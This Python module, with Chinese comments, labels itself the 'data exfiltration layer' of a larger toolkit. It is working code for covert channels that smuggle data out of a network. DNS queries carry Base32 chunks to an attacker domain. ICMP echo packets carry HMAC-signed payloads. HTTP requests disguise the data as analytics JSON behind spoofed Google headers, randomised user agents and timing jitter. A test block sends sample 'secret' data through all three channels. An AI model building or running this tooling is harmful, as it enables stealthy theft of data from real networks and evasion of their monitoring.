#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
模块 08: 数据回传层 —— 多路复用隐蔽信道

第一性原理实现:
    - DNS 隧道   : 数据 Base32 编码为合法域名, 通过 TXT 查询外带
    - ICMP 隧道  : CovertPacket 封装于 ICMP Echo 数据段, 手工计算 ICMP 校验和
    - HTTP 隧道  : CovertPacket Base64 后伪装成 JSON 业务请求体
    - CovertPacket: 自定义二进制协议 (magic + 版本 + 类型 + 标志 + 序列号 + 会话 + 载荷 + HMAC)
"""

import socket
import struct
import hashlib
import hmac as hmac_mod
import time
import random
import base64
import zlib
import json
import os
from dataclasses import dataclass
from typing import Optional


# ============================ 通用协议包 ============================ #
@dataclass
class CovertPacket:
    """自定义隐蔽协议数据包。"""
    version: int = 1
    ptype: int = 0          # 0 heartbeat / 1 data / 2 command / 3 ack
    flags: int = 0
    seq: int = 0
    session: int = 0
    payload: bytes = b''
    HEADER = 24
    MAGIC = 0xDEADBEEF

    def pack(self, key: bytes) -> bytes:
        cs = hmac_mod.new(key, struct.pack('!I', self.seq) + self.payload,
                          hashlib.sha256).digest()[:16]
        head = struct.pack('!I B B I I H', self.MAGIC, self.version, self.ptype,
                           self.flags, self.seq, self.session)
        return head + struct.pack('!H', len(self.payload)) + cs + self.payload

    @classmethod
    def unpack(cls, data: bytes, key: bytes) -> Optional['CovertPacket']:
        if len(data) < cls.HEADER or struct.unpack('!I', data[:4])[0] != cls.MAGIC:
            return None
        magic, ver, pt, fl, seq, ses = struct.unpack('!I B B I I H', data[:16])
        plen = struct.unpack('!H', data[16:18])[0]
        cs = data[18:34]
        pl = data[34:34 + plen]
        expect = hmac_mod.new(key, struct.pack('!I', seq) + pl,
                             hashlib.sha256).digest()[:16]
        if not hmac_mod.compare_digest(cs, expect):
            return None
        return cls(ver, pt, fl, seq, ses, pl)


# ============================ DNS 隧道 ============================ #
class DNSExfil:
    """将任意二进制数据编码为 DNS 查询, 通过 TXT 类型外带。"""

    def __init__(self, domain: str = "exfil.attacker.test", chunk: int = 50):
        self.domain = domain
        self.chunk = chunk

    def encode(self, data: bytes) -> list:
        b32 = base64.b32encode(data).decode().lower().replace('=', '')
        crc = zlib.crc32(data) & 0xFFFFFFFF
        total = (len(b32) + self.chunk - 1) // self.chunk
        out, seq = [], 0
        for i in range(0, len(b32), self.chunk):
            out.append(f"{seq:04x}{crc:08x}{b32[i:i + self.chunk]}")
            seq += 1
        return out

    @staticmethod
    def _build_query(domain: str) -> bytes:
        tid = random.randint(0, 65535)
        q = b''
        for label in domain.split('.'):
            q += struct.pack('!B', len(label)) + label.encode()
        q += b'\x00'
        return struct.pack('!HHHHHH', tid, 0x0100, 1, 0, 0, 0) + q + \
               struct.pack('!H', 16) + struct.pack('!H', 1)

    def transmit(self, data: bytes, ns: str = "8.8.8.8"):
        for label in self.encode(data):
            pkt = self._build_query(f"{label}.{self.domain}")
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.settimeout(2)
                    s.sendto(pkt, (ns, 53))
                    s.recv(512)
            except (socket.timeout, OSError):
                pass
            time.sleep(random.uniform(0.1, 0.5))


# ============================ ICMP 隧道 ============================ #
class ICMPTunnel:
    """CovertPacket 封装于 ICMP Echo Request 数据段。"""

    def __init__(self, dst: str, key: bytes = b'secret'):
        self.dst = dst
        self.key = key
        self.icmp_id = random.randint(0, 65535)
        self.seq = 0

    def _icmp_checksum(self, data: bytes) -> int:
        if len(data) % 2:
            data += b'\x00'
        s = sum((data[i] << 8) + data[i + 1] for i in range(0, len(data), 2))
        while s >> 16:
            s = (s & 0xFFFF) + (s >> 16)
        return (~s) & 0xFFFF

    def _packet(self, ptype: int, payload: bytes) -> bytes:
        cp = CovertPacket(ptype=ptype, seq=self.seq, session=self.icmp_id,
                          payload=payload)
        body = cp.pack(self.key)
        cs = self._icmp_checksum(struct.pack('!BBHHH', 8, 0, 0, self.icmp_id, self.seq) + body)
        self.seq += 1
        return struct.pack('!BBHHH', 8, 0, cs, self.icmp_id, self.seq - 1) + body

    def send(self, data: bytes):
        maxp = 1024
        for i in range(0, len(data), maxp):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                s.sendto(self._packet(1, data[i:i + maxp]), (self.dst, 0))
                s.close()
            except PermissionError:
                print("[-] ICMP 需要 root / CAP_NET_RAW")
                return
            time.sleep(random.uniform(0.05, 0.2))


# ============================ HTTP 隧道 ============================ #
class HTTPCovert:
    """CovertPacket 伪装为正常业务 JSON 请求体。"""

    def __init__(self, url: str, ua: str = None):
        self.url = url
        self.ua = ua or random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        ])
        self.sid = random.randint(0, 0xFFFFFFFF)
        self.seq = 0

    def transmit(self, data: bytes, endpoint: str = "/api/v2/analytics") -> bytes:
        import urllib.request
        cp = CovertPacket(ptype=1, seq=self.seq, session=self.sid,
                          payload=zlib.compress(data, 9))
        self.seq += 1
        body = json.dumps({
            'analytics_id': self.sid,
            'report_type': 'performance_metrics',
            'timestamp': int(time.time()),
            'metrics': {'cpu': random.uniform(10, 90), 'mem': random.uniform(20, 80),
                        'io': random.uniform(0, 100), 'net': random.uniform(1, 1000)},
            'encoded_data': base64.b64encode(cp.pack(b'secret')).decode(),
            'checksum': hashlib.md5(cp.pack(b'secret')).hexdigest()
        }).encode()
        host = self.url.split('/')[2]
        req = urllib.request.Request(
            self.url + endpoint,
            data=body,
            headers={'User-Agent': self.ua, 'Content-Type': 'application/json',
                     'Accept': 'application/json', 'Origin': 'https://www.google.com',
                     'Referer': 'https://www.google.com/search?q=analytics',
                     'Content-Length': str(len(body))})
        return urllib.request.urlopen(req, timeout=10).read()


if __name__ == "__main__":
    data = b"SECRET_EXFIL_DATA_" + os.urandom(200)
    key = b'preshared-key-2024'

    print("===== DNS 隧道 =====")
    DNSExfil("exfil.test").transmit(data)

    print("===== ICMP 隧道 =====")
    ICMPTunnel("127.0.0.1", key).send(data)

    print("===== HTTP 隧道 =====")
    HTTPCovert("http://httpbin.org").transmit(data)
